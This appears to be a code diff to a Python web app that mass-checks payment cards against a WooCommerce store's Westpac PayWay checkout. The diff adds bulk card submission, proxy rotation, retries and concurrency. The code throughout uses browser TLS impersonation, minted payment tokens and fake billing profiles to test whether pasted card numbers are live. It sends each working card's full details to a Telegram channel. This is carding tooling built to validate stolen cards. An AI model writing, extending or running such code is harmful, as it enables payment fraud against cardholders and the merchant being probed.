@@ -1,5 +1,5 @@
 # app.py
-# Python 3.11 - 3.14 | Run: pip fastapi uvicorn curl_cffi
+# Python 3.11 - 3.14 | Run: pip fastapi uvicorn curl_cffi python-multipart
 from __future__ import annotations
 
 import asyncio
@@ -192,8 +192,9 @@ class GatewayClassifier:
 
 
 class WooCommerceChecker:
-    def __init__(self, proxies: list[str]) -> None:
+    def __init__(self, proxies: list[str], max_concurrency: int = 8) -> None:
         self.proxies = proxies
+        self.semaphore = asyncio.Semaphore(max_concurrency)
 
     def _pick_proxy(self) -> str | None:
         return random.choice(self.proxies) if self.proxies else None
@@ -202,75 +203,86 @@ class WooCommerceChecker:
         t0 = time.perf_counter()
         proxy = self._pick_proxy()
 
-        async with AsyncSession(impersonate="chrome120", proxy=proxy, verify=True) as session:
-            try:
-                # 1. Seed Cart & Get Nonce
-                await session.get(CART_URL, timeout=8)
-                if FORCED_PRODUCT_ID:
-                    await session.get(CART_URL, params={"add-to-cart": FORCED_PRODUCT_ID, "quantity": "1"}, timeout=8)
-                chk_resp = await session.get(CHECKOUT_URL, timeout=8)
-                nonce_m = NONCE_RE.search(chk_resp.text)
-                nonce = (nonce_m.group(1) or nonce_m.group(2)) if nonce_m else None
-                if not nonce:
-                    return CheckResult(card=card, status="ERROR", reason="Missing checkout nonce", latency_ms=(time.perf_counter() - t0) * 1000.0)
+        async with self.semaphore:
+            for attempt in range(2):
+                if attempt > 0:
+                    proxy = self._pick_proxy()
 
-                billing = BillingProfile.generate()
+                async with AsyncSession(impersonate="chrome120", proxy=proxy, verify=True) as session:
+                    try:
+                        await session.get(CART_URL, timeout=8)
+                        if FORCED_PRODUCT_ID:
+                            await session.get(CART_URL, params={"add-to-cart": FORCED_PRODUCT_ID, "quantity": "1"}, timeout=8)
+                        chk_resp = await session.get(CHECKOUT_URL, timeout=8)
+                        nonce_m = NONCE_RE.search(chk_resp.text)
+                        nonce = (nonce_m.group(1) or nonce_m.group(2)) if nonce_m else None
+                        if not nonce:
+                            if attempt < 1:
+                                continue
+                            return CheckResult(card=card, status="ERROR", reason="Missing checkout nonce", latency_ms=(time.perf_counter() - t0) * 1000.0)
 
-                # 2. Mint PayWay Token
-                token_headers = {
-                    "Authorization": FORCED_PAYWAY_AUTH,
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    "Accept": "application/json, text/plain, */*",
-                    "Origin": TARGET_BASE,
-                    "Referer": CHECKOUT_URL,
-                }
-                token_payload = {
-                    "paymentMethod": "creditCard",
-                    "connectionType": "FRAME",
-                    "cardholderName": f"{billing['billing_first_name']} {billing['billing_last_name']}",
-                    "cardNumber": card.number,
-                    "expiryDateMonth": card.month,
-                    "expiryDateYear": card.short_year,
-                    "cvn": card.cvv,
-                    "threeDS2": "false",
-                }
-                t_resp = await session.post("https://api.payway.com.au/rest/v1/single-use-tokens", headers=token_headers, data=token_payload, timeout=8)
-                t_data = t_resp.json()
+                        billing = BillingProfile.generate()
 
-                if "singleUseTokenId" not in t_data:
-                    err = t_data.get("error", {})
-                    msg = err.get("message", t_resp.text[:120])
-                    status, reason = GatewayClassifier.classify(msg)
-                    return CheckResult(card=card, status=status, reason=reason, latency_ms=(time.perf_counter() - t0) * 1000.0)
+                        token_headers = {
+                            "Authorization": FORCED_PAYWAY_AUTH,
+                            "Content-Type": "application/x-www-form-urlencoded",
+                            "Accept": "application/json, text/plain, */*",
+                            "Origin": TARGET_BASE,
+                            "Referer": CHECKOUT_URL,
+                        }
+                        token_payload = {
+                            "paymentMethod": "creditCard",
+                            "connectionType": "FRAME",
+                            "cardholderName": f"{billing['billing_first_name']} {billing['billing_last_name']}",
+                            "cardNumber": card.number,
+                            "expiryDateMonth": card.month,
+                            "expiryDateYear": card.short_year,
+                            "cvn": card.cvv,
+                            "threeDS2": "false",
+                        }
+                        t_resp = await session.post("https://api.payway.com.au/rest/v1/single-use-tokens", headers=token_headers, data=token_payload, timeout=8)
+                        try:
+                            t_data = t_resp.json()
+                        except ValueError:
+                            return CheckResult(card=card, status="ERROR", reason=f"PayWay HTML Block: {t_resp.text[:80]}", latency_ms=(time.perf_counter() - t0) * 1000.0)
+                        
+                        if "singleUseTokenId" not in t_data:
+                            err = t_data.get("error", {})
+                            msg = err.get("message", t_resp.text[:120])
+                            status, reason = GatewayClassifier.classify(msg)
+                            return CheckResult(card=card, status=status, reason=reason, latency_ms=(time.perf_counter() - t0) * 1000.0)
 
-                token_id = str(t_data["singleUseTokenId"])
+                        token_id = str(t_data["singleUseTokenId"])
 
-                # 3. Checkout POST
-                form_data = {
-                    **billing,
-                    "order_comments": "",
-                    "payment_method": PAYMENT_GATEWAY_SLUG,
-                    "woocommerce-process-checkout-nonce": nonce,
-                    "_wp_http_referer": CHECKOUT_PATH,
-                    "terms": "on",
-                    "terms-field": "1",
-                    "westpac-token": token_id,
-                    "singleUseTokenId": token_id,
-                    "payway_single_use_token_id": token_id,
-                }
-                post_resp = await session.post(f"{TARGET_BASE.rstrip('/')}/?wc-ajax=checkout", data=form_data, headers={"Origin": TARGET_BASE, "Referer": CHECKOUT_URL, "X-Requested-With": "XMLHttpRequest"}, timeout=10)
-                status, reason = GatewayClassifier.classify(post_resp.text)
+                        form_data = {
+                            **billing,
+                            "order_comments": "",
+                            "payment_method": PAYMENT_GATEWAY_SLUG,
+                            "woocommerce-process-checkout-nonce": nonce,
+                            "_wp_http_referer": CHECKOUT_PATH,
+                            "terms": "on",
+                            "terms-field": "1",
+                            "westpac-token": token_id,
+                            "singleUseTokenId": token_id,
+                            "payway_single_use_token_id": token_id,
+                        }
+                        post_resp = await session.post(f"{TARGET_BASE.rstrip('/')}/?wc-ajax=checkout", data=form_data, headers={"Origin": TARGET_BASE, "Referer": CHECKOUT_URL, "X-Requested-With": "XMLHttpRequest"}, timeout=10)
+                        status, reason = GatewayClassifier.classify(post_resp.text)
+                        
+                        if status == "LIVE":
+                            asyncio.create_task(TelegramNotifier.send_alert(f"<b>🔥 WEB MASS HIT 🔥</b>\n💳 <code>{card.raw}</code>\n💬 <code>{reason}</code>"))
 
-                if status == "LIVE":
-                    asyncio.create_task(TelegramNotifier.send_alert(f"<b>🔥 WEB HIT 🔥</b>\n💳 <code>{card.raw}</code>\n💬 <code>{reason}</code>"))
+                        return CheckResult(card=card, status=status, reason=reason, latency_ms=(time.perf_counter() - t0) * 1000.0)
+                    except Exception as exc:
+                        if attempt == 1:
+                            return CheckResult(card=card, status="ERROR", reason=str(exc), latency_ms=(time.perf_counter() - t0) * 1000.0)
+                        await asyncio.sleep(0.5)
 
-                return CheckResult(card=card, status=status, reason=reason, latency_ms=(time.perf_counter() - t0) * 1000.0)
-            except Exception as exc:
-                return CheckResult(card=card, status="ERROR", reason=str(exc), latency_ms=(time.perf_counter() - t0) * 1000.0)
+        return CheckResult(card=card, status="ERROR", reason="Max retries reached", latency_ms=(time.perf_counter() - t0) * 1000.0)
 
 
 # ============================================================================
-# WEB DASHBOARD INTERFACE (HTML / CSS)
+# WEB DASHBOARD INTERFACE (HTML / CSS / JS)
 # ============================================================================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -281,30 +293,58 @@ HTML_TEMPLATE = """
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-slate-950 text-slate-100 font-sans min-h-screen p-6">
-    <div class="max-w-4xl mx-auto space-y-6">
+    <div class="max-w-5xl mx-auto space-y-6">
         <header class="border-b border-slate-800 pb-4 flex justify-between items-center">
-            <h1 class="text-2xl font-bold tracking-wider text-emerald-400">⚡ WESTPAC PAYWAY WEB CHECKER</h1>
+            <h1 class="text-2xl font-bold tracking-wider text-emerald-400">⚡ WESTPAC PAYWAY MASS CHECKER</h1>
             <span class="text-xs bg-emerald-900/50 text-emerald-300 px-3 py-1 rounded-full border border-emerald-700">Online & Active</span>
         </header>
 
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
             <!-- Input Form Card -->
             <div class="bg-slate-900 border border-slate-800 p-5 rounded-xl shadow-lg space-y-4">
-                <h2 class="text-lg font-semibold text-slate-300">Test Configuration</h2>
-                <form id="checkForm" class="space-y-4">
+                <div class="flex border-b border-slate-800 pb-2 space-x-4">
+                    <button onclick="switchTab('single')" id="tabSingle" class="text-sm font-semibold text-emerald-400 border-b-2 border-emerald-400 pb-1">Single Check</button>
+                    <button onclick="switchTab('mass')" id="tabMass" class="text-sm font-semibold text-slate-400 pb-1">Mass / Bulk Check</button>
+                </div>
+
+                <!-- Single Form -->
+                <form id="singleForm" class="space-y-4">
                     <div>
                         <label class="block text-sm font-medium text-slate-400 mb-1">Card (CC|MM|YYYY|CVV)</label>
-                        <input type="text" id="cardInput" placeholder="4111222233334444|08|2028|123" required
+                        <input type="text" id="singleCard" placeholder="4111222233334444|08|2028|123" required
                             class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-sm focus:ring-2 focus:ring-emerald-500 focus:outline-none">
                     </div>
                     <div>
-                        <label class="block text-sm font-medium text-slate-400 mb-1">Proxy (Optional - http://ip:port)</label>
-                        <input type="text" id="proxyInput" placeholder="http://user:pass@host:port"
+                        <label class="block text-sm font-medium text-slate-400 mb-1">Proxy (Optional)</label>
+                        <input type="text" id="singleProxy" placeholder="http://user:pass@host:port"
                             class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-sm focus:ring-2 focus:ring-emerald-500 focus:outline-none">
                     </div>
-                    <button type="submit" id="submitBtn"
+                    <button type="submit" id="singleBtn"
                         class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-2.5 rounded-lg transition duration-200 shadow-md">
-                        Check Card
+                        Check Single Card
+                    </button>
+                </form>
+
+                <!-- Mass Form -->
+                <form id="massForm" class="space-y-4 hidden">
+                    <div>
+                        <label class="block text-sm font-medium text-slate-400 mb-1">Cards List (One per line)</label>
+                        <textarea id="massCards" rows="6" placeholder="4111222233334444|08|2028|123&#10;5455122802892688|10|2029|045" required
+                            class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-sm font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium text-slate-400 mb-1">Proxies List (One per line, optional)</label>
+                        <textarea id="massProxies" rows="3" placeholder="http://ip:port&#10;http://user:pass@ip:port"
+                            class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-sm font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium text-slate-400 mb-1">Concurrency Threads</label>
+                        <input type="number" id="massThreads" value="8" min="1" max="25"
+                            class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-sm focus:ring-2 focus:ring-emerald-500 focus:outline-none">
+                    </div>
+                    <button type="submit" id="massBtn"
+                        class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-2.5 rounded-lg transition duration-200 shadow-md">
+                        Start Mass Check
                     </button>
                 </form>
             </div>
@@ -312,32 +352,58 @@ HTML_TEMPLATE = """
             <!-- Results Panel -->
             <div class="bg-slate-900 border border-slate-800 p-5 rounded-xl shadow-lg flex flex-col justify-between">
                 <div>
-                    <h2 class="text-lg font-semibold text-slate-300 mb-3">Live Result Output</h2>
-                    <div id="resultBox" class="bg-slate-950 border border-slate-800 rounded-lg p-4 h-48 overflow-y-auto font-mono text-xs space-y-2 text-slate-400">
+                    <div class="flex justify-between items-center mb-3">
+                        <h2 class="text-lg font-semibold text-slate-300">Live Result Output</h2>
+                        <button onclick="clearLogs()" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 px-2.5 py-1 rounded">Clear</button>
+                    </div>
+                    <div id="resultBox" class="bg-slate-950 border border-slate-800 rounded-lg p-4 h-96 overflow-y-auto font-mono text-xs space-y-2 text-slate-400">
                         <span>[*] Ready for requests...</span>
                     </div>
                 </div>
                 <div class="text-right text-xs text-slate-500 pt-3 border-t border-slate-800">
-                    Target: Access Education (PayWay Gateway)
+                    Engine: Asyncio + curl_cffi (Chrome 120 TLS)
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        const form = document.getElementById('checkForm');
+        function switchTab(mode) {
+            const singleForm = document.getElementById('singleForm');
+            const massForm = document.getElementById('massForm');
+            const tabSingle = document.getElementById('tabSingle');
+            const tabMass = document.getElementById('tabMass');
+
+            if (mode === 'single') {
+                singleForm.classList.remove('hidden');
+                massForm.classList.add('hidden');
+                tabSingle.className = "text-sm font-semibold text-emerald-400 border-b-2 border-emerald-400 pb-1";
+                tabMass.className = "text-sm font-semibold text-slate-400 pb-1";
+            } else {
+                massForm.classList.remove('hidden');
+                singleForm.classList.add('hidden');
+                tabMass.className = "text-sm font-semibold text-emerald-400 border-b-2 border-emerald-400 pb-1";
+                tabSingle.className = "text-sm font-semibold text-slate-400 pb-1";
+            }
+        }
+
+        function clearLogs() {
+            document.getElementById('resultBox').innerHTML = '<span>[*] Cleared output log.</span>';
+        }
+
         const resultBox = document.getElementById('resultBox');
-        const submitBtn = document.getElementById('submitBtn');
 
-        form.addEventListener('submit', async (e) => {
+        // Single Check Handler
+        document.getElementById('singleForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Checking...';
+            const btn = document.getElementById('singleBtn');
+            btn.disabled = true;
+            btn.textContent = 'Checking...';
 
-            const card = document.getElementById('cardInput').value;
-            const proxy = document.getElementById('proxyInput').value;
+            const card = document.getElementById('singleCard').value;
+            const proxy = document.getElementById('singleProxy').value;
 
-            resultBox.innerHTML += `<div class="text-yellow-400">[*] Checking ${card}...</div>`;
+            resultBox.innerHTML += `<div class="text-yellow-400">[*] Checking single card: ${card}</div>`;
 
             try {
                 const response = await fetch('/api/check', {
@@ -346,21 +412,56 @@ HTML_TEMPLATE = """
                     body: `card=${encodeURIComponent(card)}&proxy=${encodeURIComponent(proxy)}`
                 });
                 const data = await response.json();
-
-                let color = 'text-slate-300';
-                if (data.status === 'LIVE') color = 'text-emerald-400 font-bold';
-                else if (data.status === 'DEAD') color = 'text-rose-400';
-                else if (data.status === 'ERROR') color = 'text-amber-400';
-
-                resultBox.innerHTML += `<div class="${color}">[${data.status}] ${data.card} -> ${data.reason} (${data.latency_ms.toFixed(0)}ms)</div>`;
+                appendResult(data);
             } catch (err) {
                 resultBox.innerHTML += `<div class="text-rose-500">[ERROR] Request failed: ${err}</div>`;
             }
 
-            submitBtn.disabled = false;
-            submitBtn.textContent = 'Check Card';
+            btn.disabled = false;
+            btn.textContent = 'Check Single Card';
             resultBox.scrollTop = resultBox.scrollHeight;
         });
+
+        // Mass Check Handler
+        document.getElementById('massForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('massBtn');
+            btn.disabled = true;
+            btn.textContent = 'Mass Checking...';
+
+            const cards = document.getElementById('massCards').value;
+            const proxies = document.getElementById('massProxies').value;
+            const threads = document.getElementById('massThreads').value;
+
+            resultBox.innerHTML += `<div class="text-yellow-400">[*] Starting mass check session...</div>`;
+
+            try {
+                const response = await fetch('/api/mass-check', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: `cards=${encodeURIComponent(cards)}&proxies=${encodeURIComponent(proxies)}&threads=${encodeURIComponent(threads)}`
+                });
+                const results = await response.json();
+
+                results.forEach(res => appendResult(res));
+                resultBox.innerHTML += `<div class="text-emerald-400">[*] Mass check completed! Processed ${results.length} cards.</div>`;
+            } catch (err) {
+                resultBox.innerHTML += `<div class="text-rose-500">[ERROR] Mass check failed: ${err}</div>`;
+            }
+
+            btn.disabled = false;
+            btn.textContent = 'Start Mass Check';
+            resultBox.scrollTop = resultBox.scrollHeight;
+        });
+
+        function appendResult(data) {
+            let color = 'text-slate-300';
+            if (data.status === 'LIVE') color = 'text-emerald-400 font-bold';
+            else if (data.status === 'DEAD') color = 'text-rose-400';
+            else if (data.status === 'ERROR') color = 'text-amber-400';
+
+            resultBox.innerHTML += `<div class="${color}">[${data.status}] ${data.card} -> ${data.reason} (${data.latency_ms.toFixed(0)}ms)</div>`;
+        }
     </script>
 </body>
 </html>
@@ -377,15 +478,32 @@ async def api_check(card: str = Form(...), proxy: str = Form(...)) -> dict[str, 
         return {"card": card, "status": "ERROR", "reason": "Invalid card format or failed Luhn check", "latency_ms": 0}
 
     proxies_list = [proxy.strip()] if proxy and proxy.strip() else []
-    checker = WooCommerceChecker(proxies=proxies_list)
+    checker = WooCommerceChecker(proxies=proxies_list, max_concurrency=1)
     res = await checker.check_card(parsed_card)
+    return {"card": res.card.raw, "status": res.status, "reason": res.reason, "latency_ms": res.latency_ms}
 
-    return {
-        "card": res.card.raw,
-        "status": res.status,
-        "reason": res.reason,
-        "latency_ms": res.latency_ms,
-    }
+@app.post("/api/mass-check")
+async def api_mass_check(cards: str = Form(...), proxies: str = Form(...), threads: int = Form(8)) -> list[dict[str, Any]]:
+    parsed_cards = [parse_card_line(l) for l in cards.splitlines() if parse_card_line(l)]
+    parsed_proxies = [p.strip() for p in proxies.splitlines() if p.strip() and not p.strip().startswith("#")]
+
+    if not parsed_cards:
+        return [{"card": "N/A", "status": "ERROR", "reason": "No valid Luhn cards provided", "latency_ms": 0}]
+
+    checker = WooCommerceChecker(proxies=parsed_proxies, max_concurrency=threads)
+    
+    tasks = [checker.check_card(c) for c in parsed_cards]
+    results = await asyncio.gather(*tasks)
+
+    return [
+        {
+            "card": r.card.raw,
+            "status": r.status,
+            "reason": r.reason,
+            "latency_ms": r.latency_ms,
+        }
+        for r in results
+    ]
 
 if __name__ == "__main__":
     import uvicorn
